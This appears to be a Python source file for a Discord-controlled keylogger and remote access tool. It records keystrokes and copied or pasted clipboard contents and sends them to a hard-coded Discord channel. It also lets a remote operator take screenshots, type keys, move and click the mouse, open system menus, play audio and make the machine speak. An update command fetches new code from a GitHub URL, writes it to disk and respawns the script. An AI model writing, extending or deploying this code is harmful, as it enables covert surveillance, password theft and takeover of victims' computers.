from pynput.keyboard import Key, Listener, Controller
from pynput.mouse import Button, Controller as Mcontroller
import discord
from discord.ext import commands
import time
import asyncio
import clipboard
import pyscreenshot as ImageGrab
import os
from PIL import Image, ImageDraw
import winsound
import requests
from os import getcwd
import auth
import sys
import pyttsx3

engine = pyttsx3.init()

client = commands.Bot(command_prefix = '!');
list = ""
clear = False
o_t = 0
t_e = 0
keyboard = Controller()
mouse = Mcontroller()
async def send_to_discord(content):
    if(content != ""):
        global list
        channel = client.get_channel(764343351998021662)
        await channel.send(content)
def on_press(key):
    global list
    global clear
    global o_t
    global t_e
    to_add = ""
    if ((str(key)[0] == "'" or str(key)[0] == '"') and len(str(key))==3):
        to_add = str(key)[1]
    elif (str(key) == "Key.space"):
        to_add = " "
    elif (str(key) == "Key.enter"):
        to_add = "[E]\n"
        clear = True
    elif (str(key) == "Key.backspace"):
        to_add = "[B]"
    elif (str(key) == "Key.right"):
        to_add = "[RIGHT]"
    elif (str(key) == "Key.left"):
        to_add = "[LEFT]"
    elif (str(key) == "Key.up"):
        to_add = "[UP]"
    elif (str(key) == "Key.down"):
        to_add = "[DOWN]"
    elif (str(key) == "Key.cmd"):
        to_add = "[WIN]"
    elif ("alt" in str(key)):
        to_add = "[ALT]"
    elif (str(key) == "Key.tab"):
        to_add = "[TAB]"
    elif ("\\x03" in str(key)):
        time.sleep(1)
        clip = clipboard.paste()
        to_add = f"\n```[COPY] {clip}```"
    elif ("\\x16" in str(key)):
        clip = clipboard.paste()
        to_add = f"\n```[PASTE] {clip}```"
    list = list+to_add
    if(clear == True):
        client.loop.create_task(send_to_discord(list))
        list = ""
        clear = False
        o_t = time.time()
    else:
        t_e = time.time()
        t_e = t_e - o_t
        if(t_e >= 600):
            clear = True
            o_t = time.time()
@client.command()
async def load(ctx):
    print("load file")
    if(len(ctx.message.attachments)>0):
        print("has attach")
        for file in ctx.message.attachments:
            await file.save("file.mp3")
            await ctx.send(f"Loaded, `{file}`")
@client.command()
async def update(ctx):
    url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.pyw"
    r = requests.get(url).content.decode('utf-8')
    await ctx.send("`got code`")
    code = str(r)
    f = open("Keys.pyw",'w')
    f.write(code)
    f.close()
    await ctx.send("`wrote code`")
    os.spawnl(os.P_WAIT, sys.executable, *([sys.executable] + (sys.argv if __package__ is None else ["-m", __loader__.name] + sys.argv[1:])))
    await ctx.send("`spawned script`")
    sys.exit()
@client.event
async def on_ready():
    channel = client.get_channel(764311637028503552)
    await channel.send("`Completed startup, ready for commands`")
@client.command()
async def play(ctx):
    try:
        playsound("file.mp3")
        os.remove('file.mp3')
    except Exception as e:
        await ctx.send(e)
@client.command()
async def rm(ctx):
    try:
        os.remove('file.mp3')
    except:
        pass
    try:
        os.remove('capture.png')
    except:
        pass
@client.command()
async def pic(ctx):
    capture = ImageGrab.grab()
    draw = ImageDraw.Draw(capture)
    print(mouse.position)
    x = (int(mouse.position[0])/1.47)
    y = (int(mouse.position[1])/1.47)
    print(x, y)
    z = 1.84
    w = 1.84
    draw.ellipse((w*x-5, z*y-5, w*x+5, z*y+5), fill=(232, 52, 39, 255), width=1)
    capture.save('capture.png')
    await ctx.send(file=discord.File("capture.png"))
    os.remove("capture.png")
@client.command()
async def run(ctx, *args):
    for arg in args:
        if("/win" == arg):
            keyboard.press(Key.cmd)
            keyboard.release(Key.cmd)
        elif("/enter" == arg):
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
        elif("/caps" == arg):
            keyboard.press(Key.caps_lock)
            keyboard.release(Key.caps_lock)
        elif("/up" == arg):
            keyboard.press(Key.up)
            keyboard.release(Key.up)
        elif("/down" == arg):
            keyboard.press(Key.down)
            keyboard.release(Key.down)
        elif("/left" == arg):
            keyboard.press(Key.left)
            keyboard.release(Key.left)
        elif("/right" == arg):
            keyboard.press(Key.right)
            keyboard.release(Key.right)
        elif("/cmd" == arg):
            keyboard.press(Key.cmd)
            keyboard.press('x')
            time.sleep(1)
            keyboard.release(Key.cmd)
            keyboard.release('x')
            keyboard.press('c')
            keyboard.release('c')
        elif("/ctrldown" == arg):
            keyboard.press(Key.ctrl)
        elif("/shiftdown" == arg):
            keyboard.press(Key.shift)
        elif("/ctrlup" == arg):
            keyboard.release(Key.ctrl)
        elif("/shiftup" == arg):
            keyboard.release(Key.shift)
        elif("/altdown" == arg):
            keyboard.press(Key.alt)
        elif("/altup" == arg):
            keyboard.release(Key.alt)
        elif("/tab" == arg):
            keyboard.press(Key.tab)
            keyboard.release(Key.tab)
        elif("/back" == arg):
            keyboard.press(Key.backspace)
            keyboard.release(Key.backspace)
        elif("/pause" == arg):
            keyboard.press(Key.backspace)
            keyboard.release(Key.backspace)
        else:
            keyboard.type(arg)
        time.sleep(1)
@client.command()
async def ctrl(ctx, arg1):
    with keyboard.pressed(Key.ctrl):
        keyboard.press(arg1)
        keyboard.release(arg1)
@client.command()
async def shift(ctx, arg1):
    with keyboard.pressed(Key.shift):
        keyboard.press(arg1)
        keyboard.release(arg1)
@client.command()
async def keydown(ctx, arg1):
    keyboard.press(arg1)
@client.command()
async def keyup(ctx, arg1):
    keyboard.release(arg1)
@client.command()
async def click(ctx, arg1):
    mouse.click(Button.left, int(arg1))
@client.command()
async def move(ctx, arg1, arg2):
    mouse.position = (int(arg1), int(arg2))
@client.command()
async def rightclick(ctx, arg1):
    mouse.click(Button.right, int(arg1))
@client.command()
async def leftdown(ctx):
    mouse.press(Button.left)
@client.command()
async def rightdown(ctx):
    mouse.press(Button.right)
@client.command()
async def leftup(ctx):
    mouse.release(Button.left)
@client.command()
async def rightup(ctx):
    mouse.release(Button.right)
@client.command()
async def ytsearch(ctx):
    mouse.position = (710, 128)
    mouse.click(Button.left, 1)
@client.command()
async def gittest(ctx):
    await ctx.send("10/10 1:34 PM")
@client.command()
async def speak(ctx, arg1):
    engine.say(arg1)
    engine.runAndWait()
with Listener(on_press=on_press) as listener:
    o_t = time.time()
    client.run(auth.auth)
